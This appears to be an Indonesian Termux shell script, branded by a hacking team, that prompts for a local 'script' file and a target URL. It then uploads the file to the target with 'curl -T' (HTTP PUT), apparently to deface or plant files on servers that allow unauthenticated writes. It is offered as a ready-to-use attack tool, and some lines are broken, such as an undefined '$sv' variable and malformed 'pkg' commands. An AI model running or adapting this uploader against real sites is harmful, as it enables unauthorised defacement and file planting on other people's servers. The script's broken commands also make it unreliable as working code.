##XERXEZ7
##TOOLA SIMPLE OKE
pkg install curl
pkg update install
pkg install update && install upgrade
clear
figlet -f slant InYourXerXez | lolcat
echo "□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□"|lolcat
echo "□ AUTHOR : INYOUR XERXEZ7      □"|lolcat
echo "□ TEAM   : 2E4H~LIT~DFA~GBLK   □"|lolcat
echo "□ SINCE  : 2K19-2K20           □"|lolcat
echo "□ CONAK  : +62 8588-xxxx-741   □"|lolcat
echo "□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□"|lolcat
date | lolcat | screenfetch -A Fux
echo ""
figlet -f slant { Y / N } | lolcat
echo ""
echo -e "╭─[SILAHKAN PILIH Y/N]" | lolcat
read -p "╰─$ " pil;

if [ $pil = Y ] || [ $pil = y ]
then
echo "□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□"
sh live.sh
echo "□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□"
echo -e "╭─[MASUKAN SC ANDA]" | lolcat
read -p "╰─$ " sc;
echo -e "╭─[MASUKAN TARGET ]" | lolcat
read -p "╰─$ " tgt;
echo -e "╭─[DIRECTORI PENYIMPANAN KAMu ]" | lolcat
read -p "╰─$ " s;
sleep 2
curl -T /sdcard/$sc $tgt
curl -T /storage/emulated/0/$sc $tgt
curl -T $s/$sv $tgt
sleep 3
clear
echo "{ CEK DI $tgt/$sc }"|lolcat
fi


if [ $pil = N ] || [ $pil = n ]
then
figlet -f big 2e4hTeam|lolcat
sleep 5
exit
fi

